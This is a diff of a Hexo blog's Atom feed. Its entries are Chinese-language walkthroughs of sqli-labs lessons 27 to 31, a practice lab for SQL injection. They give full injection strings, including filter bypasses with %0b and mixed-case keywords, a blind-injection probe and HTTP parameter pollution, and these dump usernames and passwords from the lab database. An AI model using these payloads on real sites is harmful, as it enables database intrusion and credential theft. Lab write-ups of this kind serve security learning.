@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2022-02-12T10:54:55.456Z</updated>
+  <updated>2022-02-13T08:15:45.880Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -17,18 +17,18 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>lesson27</title>
-    <link href="http://example.com/2022/02/01/lesson27/"/>
-    <id>http://example.com/2022/02/01/lesson27/</id>
-    <published>2022-02-01T05:36:21.000Z</published>
-    <updated>2022-02-12T10:54:55.456Z</updated>
+    <title>lesson-29</title>
+    <link href="http://example.com/2022/02/01/lesson-29/"/>
+    <id>http://example.com/2022/02/01/lesson-29/</id>
+    <published>2022-02-01T11:57:27.000Z</published>
+    <updated>2022-02-13T08:15:45.880Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="lesson27"><a href="#lesson27" class="headerlink" title="lesson27"></a>lesson27</h1><p><img src="https://s2.loli.net/2022/02/11/qPV5SrDFJY23Llb.png" alt="QQ截图20220211160219.png"></p><p>因为没有报错的回显所以我们采用联合查询</p><p>又因为select和union又被过滤，所以我们采用uNion和sElect </p><p>?id=11111’  %0b uNion %0b sElect %0b 1,2,3 ||’1’=’1</p><p><img src="https://s2.loli.net/2022/02/11/d9YUSojrPWRaHmv.png" alt="QQ截图20220211185056.png"></p><p>?id=11111’  %0b uNion %0b sElect %0b 1,database(),3 ||’1’=’1</p><p><img src="https://s2.loli.net/2022/02/11/v5Fg7dP8WMDxslQ.png" alt="QQ截图20220211185216.png"></p><p>?id=11111’  %0b uNion %0b sElect %0b 1,(sElect(group_concat(table_name))from(information_schema.tables)where(table_schema=’security’)),3 ||’1’=’1</p><p><img src="https://s2.loli.net/2022/02/11/rKFUIOTysvoJqBl.png" alt="QQ截图20220211185630.png"></p><p>?id=11111’  %0b uNion %0b sElect %0b 1,(sElect(group_concat(column_name))from(information_schema.columns)where(table_name=’users’)),3 ||’1’=’1</p><p><img src="https://s2.loli.net/2022/02/11/ldb9HrIsU8RKqaB.png" alt="QQ截图20220211185828.png"></p><p>?id=11111’  %0b uNion %0b sElect %0b 1,(sElect(group_concat(concat_ws(0x7e,username,password)))from(security.users)),3 ||’1’=’1</p><p><img src="https://s2.loli.net/2022/02/11/SbZC5cD3FqGHPLW.png" alt="QQ截图20220211190332.png"></p><h1 id="lesson27a"><a href="#lesson27a" class="headerlink" title="lesson27a"></a>lesson27a</h1><p>lesson27a是相同的方法，和lesson27一样</p><p>主要是空格用%a0或者%0b来代替</p><h1 id="lesson-28"><a href="#lesson-28" class="headerlink" title="lesson 28"></a>lesson 28</h1><p>由</p><p><a href="http://sqli-labs/Less-28/?id=1&#39;)||(&#39;1&#39;)=">http://sqli-labs/Less-28/?id=1&#39;)||(&#39;1&#39;)=</a>(‘1</p><p>是（’’）的包裹方式</p><p>我这里采用盲注来做，但是很多师傅的参考都是用联合查询来做的，我的sql-liblesson28抽风了，空格老是被注释了</p><p>?id=0’)||left(database(),2)=’se’;%00</p><p><img src="https://s2.loli.net/2022/02/12/FevtEJ57W81Gx6B.png" alt="QQ截图20220212184908.png"></p><p>盲注爆出库，表，列</p><h1 id="lesson-28a"><a href="#lesson-28a" class="headerlink" title="lesson 28a"></a>lesson 28a</h1><p>同样的payload，lesson28也可以做，所以跳过了</p>]]></content>
+    <content type="html"><![CDATA[<h1 id="lesson-29"><a href="#lesson-29" class="headerlink" title="lesson 29"></a>lesson 29</h1><h2 id="首先是了解服务器两层架构"><a href="#首先是了解服务器两层架构" class="headerlink" title="首先是了解服务器两层架构"></a>首先是了解服务器两层架构</h2><p>参考<a href="https://www.cnblog.com/lcamry/p/5762961.html">mysql注入天书之服务器</a></p><p>总之就是要再去搭一个jsp的平台来</p><p>同时打开phpstudy和jspstudy</p><p>通过index.jsp访问到index.php生成的页面</p><p>（buuctf里面的lesson29完全没意义，就跟lesson1一样，老坑人了，这里最好自己搭一个）</p><p><img src="https://s2.loli.net/2022/02/13/496ZE8RYbSBfMUC.png" alt="QQ截图20220213145419.png"></p><p>通过修改第一个id发现回显不会发生变化，且注入会被拦截</p><p><img src="https://s2.loli.net/2022/02/13/7Df26N8sAyEFiRe.png" alt="QQ截图20220213150822.png"></p><p>但是修改第二个id则会回显id对应的username和password，且超出数据 会报错</p><p>所以第二个id处可注入</p><p>联合查询，步骤参考lesson 1</p><p>?id=1&amp;id=-1’ union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=’security’–+</p><p><img src="https://s2.loli.net/2022/02/13/9NX1JIVvGoyLdQ8.png" alt="QQ截图20220213151441.png"></p><p>?id=1&amp;id=-1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’users’–+</p><p><img src="https://s2.loli.net/2022/02/13/IBRWVCXS9Z3LEvp.png" alt="QQ截图20220213152239.png"></p><h1 id="lesson-30"><a href="#lesson-30" class="headerlink" title="lesson 30"></a>lesson 30</h1><p>和29差不多，不过是数据的包裹变成了双引号</p><p><img src="https://s2.loli.net/2022/02/13/a4Cupvjb932Dtyl.png" alt="QQ截图20220213154154.png"></p><p>查库</p><p>?id=1&amp;id=-3”union select 1,database(),3–+</p><p>查表</p><p>?id=1&amp;id=-3”union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=’security’–+</p><p>查列</p><p>?id=1&amp;id=-3”union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=’users’–+</p><p>查字段</p><p>?id=1&amp;id=-3”union select 1,database(),group_concat(concat_ws(‘@@’,username,password)) from security.users–+</p><h1 id="lesson-31"><a href="#lesson-31" class="headerlink" title="lesson 31"></a>lesson 31</h1><p>和前面一样</p><p>就是对数据的包裹变成了双引号加括号的形式</p><p>?id=1&amp;id=-3”) union select 1,2,3–+</p><p><img src="https://s2.loli.net/2022/02/13/voqCabJnfQHSrze.png" alt="QQ截图20220213155229.png"></p><p>?id=1&amp;id=-3”) union select 1,database(),group_concat(table_name)from information_schema.tables where table_schema=’security’–+</p><p>?id=1&amp;id=-3”) union select 1,database(),group_concat(column_name)from information_schema.columns where table_name=’users’–+</p><p>?id=1&amp;id=-3”) union select 1,database(),group_concat(concat_ws(0x7e,username,password))from security.users–+</p>]]></content>
     
     
       
       
-    <summary type="html">&lt;h1 id=&quot;lesson27&quot;&gt;&lt;a href=&quot;#lesson27&quot; class=&quot;headerlink&quot; title=&quot;lesson27&quot;&gt;&lt;/a&gt;lesson27&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://s2.loli.net/2022/02/11/qPV5S</summary>
+    <summary type="html">&lt;h1 id=&quot;lesson-29&quot;&gt;&lt;a href=&quot;#lesson-29&quot; class=&quot;headerlink&quot; title=&quot;lesson 29&quot;&gt;&lt;/a&gt;lesson 29&lt;/h1&gt;&lt;h2 id=&quot;首先是了解服务器两层架构&quot;&gt;&lt;a href=&quot;#首先是了解服务器两层架构&quot;</summary>
       
     
     
@@ -41,18 +41,18 @@
   </entry>
   
   <entry>
-    <title>lesson-29</title>
-    <link href="http://example.com/2022/01/31/lesson-29/"/>
-    <id>http://example.com/2022/01/31/lesson-29/</id>
-    <published>2022-01-31T11:57:27.000Z</published>
-    <updated>2022-02-13T08:03:30.567Z</updated>
+    <title>lesson27</title>
+    <link href="http://example.com/2022/01/31/lesson27/"/>
+    <id>http://example.com/2022/01/31/lesson27/</id>
+    <published>2022-01-31T05:36:21.000Z</published>
+    <updated>2022-02-13T08:15:23.845Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="lesson-29"><a href="#lesson-29" class="headerlink" title="lesson 29"></a>lesson 29</h1><h2 id="首先是了解服务器两层架构"><a href="#首先是了解服务器两层架构" class="headerlink" title="首先是了解服务器两层架构"></a>首先是了解服务器两层架构</h2><p>参考<a href="https://www.cnblog.com/lcamry/p/5762961.html">mysql注入天书之服务器</a></p><p>总之就是要再去搭一个jsp的平台来</p><p>同时打开phpstudy和jspstudy</p><p>通过index.jsp访问到index.php生成的页面</p><p>（buuctf里面的lesson29完全没意义，就跟lesson1一样，老坑人了，这里最好自己搭一个）</p><p><img src="https://s2.loli.net/2022/02/13/496ZE8RYbSBfMUC.png" alt="QQ截图20220213145419.png"></p><p>通过修改第一个id发现回显不会发生变化，且注入会被拦截</p><p><img src="https://s2.loli.net/2022/02/13/7Df26N8sAyEFiRe.png" alt="QQ截图20220213150822.png"></p><p>但是修改第二个id则会回显id对应的username和password，且超出数据 会报错</p><p>所以第二个id处可注入</p><p>联合查询，步骤参考lesson 1</p><p>?id=1&amp;id=-1’ union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=’security’–+</p><p><img src="https://s2.loli.net/2022/02/13/9NX1JIVvGoyLdQ8.png" alt="QQ截图20220213151441.png"></p><p>?id=1&amp;id=-1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’users’–+</p><p><img src="https://s2.loli.net/2022/02/13/IBRWVCXS9Z3LEvp.png" alt="QQ截图20220213152239.png"></p><h1 id="lesson-30"><a href="#lesson-30" class="headerlink" title="lesson 30"></a>lesson 30</h1><p>和29差不多，不过是数据的包裹变成了双引号</p><p><img src="https://s2.loli.net/2022/02/13/a4Cupvjb932Dtyl.png" alt="QQ截图20220213154154.png"></p><p>查库</p><p>?id=1&amp;id=-3”union select 1,database(),3–+</p><p>查表</p><p>?id=1&amp;id=-3”union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=’security’–+</p><p>查列</p><p>?id=1&amp;id=-3”union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=’users’–+</p><p>查字段</p><p>?id=1&amp;id=-3”union select 1,database(),group_concat(concat_ws(‘@@’,username,password)) from security.users–+</p><h1 id="lesson-31"><a href="#lesson-31" class="headerlink" title="lesson 31"></a>lesson 31</h1><p>和前面一样</p><p>就是对数据的包裹变成了双引号加括号的形式</p><p>?id=1&amp;id=-3”) union select 1,2,3–+</p><p><img src="https://s2.loli.net/2022/02/13/voqCabJnfQHSrze.png" alt="QQ截图20220213155229.png"></p><p>?id=1&amp;id=-3”) union select 1,database(),group_concat(table_name)from information_schema.tables where table_schema=’security’–+</p><p>?id=1&amp;id=-3”) union select 1,database(),group_concat(column_name)from information_schema.columns where table_name=’users’–+</p><p>?id=1&amp;id=-3”) union select 1,database(),group_concat(concat_ws(0x7e,username,password))from security.users–+</p>]]></content>
+    <content type="html"><![CDATA[<h1 id="lesson27"><a href="#lesson27" class="headerlink" title="lesson27"></a>lesson27</h1><p><img src="https://s2.loli.net/2022/02/11/qPV5SrDFJY23Llb.png" alt="QQ截图20220211160219.png"></p><p>因为没有报错的回显所以我们采用联合查询</p><p>又因为select和union又被过滤，所以我们采用uNion和sElect </p><p>?id=11111’  %0b uNion %0b sElect %0b 1,2,3 ||’1’=’1</p><p><img src="https://s2.loli.net/2022/02/11/d9YUSojrPWRaHmv.png" alt="QQ截图20220211185056.png"></p><p>?id=11111’  %0b uNion %0b sElect %0b 1,database(),3 ||’1’=’1</p><p><img src="https://s2.loli.net/2022/02/11/v5Fg7dP8WMDxslQ.png" alt="QQ截图20220211185216.png"></p><p>?id=11111’  %0b uNion %0b sElect %0b 1,(sElect(group_concat(table_name))from(information_schema.tables)where(table_schema=’security’)),3 ||’1’=’1</p><p><img src="https://s2.loli.net/2022/02/11/rKFUIOTysvoJqBl.png" alt="QQ截图20220211185630.png"></p><p>?id=11111’  %0b uNion %0b sElect %0b 1,(sElect(group_concat(column_name))from(information_schema.columns)where(table_name=’users’)),3 ||’1’=’1</p><p><img src="https://s2.loli.net/2022/02/11/ldb9HrIsU8RKqaB.png" alt="QQ截图20220211185828.png"></p><p>?id=11111’  %0b uNion %0b sElect %0b 1,(sElect(group_concat(concat_ws(0x7e,username,password)))from(security.users)),3 ||’1’=’1</p><p><img src="https://s2.loli.net/2022/02/11/SbZC5cD3FqGHPLW.png" alt="QQ截图20220211190332.png"></p><h1 id="lesson27a"><a href="#lesson27a" class="headerlink" title="lesson27a"></a>lesson27a</h1><p>lesson27a是相同的方法，和lesson27一样</p><p>主要是空格用%a0或者%0b来代替</p><h1 id="lesson-28"><a href="#lesson-28" class="headerlink" title="lesson 28"></a>lesson 28</h1><p>由</p><p><a href="http://sqli-labs/Less-28/?id=1&#39;)||(&#39;1&#39;)=">http://sqli-labs/Less-28/?id=1&#39;)||(&#39;1&#39;)=</a>(‘1</p><p>是（’’）的包裹方式</p><p>我这里采用盲注来做，但是很多师傅的参考都是用联合查询来做的，我的sql-liblesson28抽风了，空格老是被注释了</p><p>?id=0’)||left(database(),2)=’se’;%00</p><p><img src="https://s2.loli.net/2022/02/12/FevtEJ57W81Gx6B.png" alt="QQ截图20220212184908.png"></p><p>盲注爆出库，表，列</p><h1 id="lesson-28a"><a href="#lesson-28a" class="headerlink" title="lesson 28a"></a>lesson 28a</h1><p>同样的payload，lesson28也可以做，所以跳过了</p>]]></content>
     
     
       
       
-    <summary type="html">&lt;h1 id=&quot;lesson-29&quot;&gt;&lt;a href=&quot;#lesson-29&quot; class=&quot;headerlink&quot; title=&quot;lesson 29&quot;&gt;&lt;/a&gt;lesson 29&lt;/h1&gt;&lt;h2 id=&quot;首先是了解服务器两层架构&quot;&gt;&lt;a href=&quot;#首先是了解服务器两层架构&quot;</summary>
+    <summary type="html">&lt;h1 id=&quot;lesson27&quot;&gt;&lt;a href=&quot;#lesson27&quot; class=&quot;headerlink&quot; title=&quot;lesson27&quot;&gt;&lt;/a&gt;lesson27&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://s2.loli.net/2022/02/11/qPV5S</summary>
       
     
     
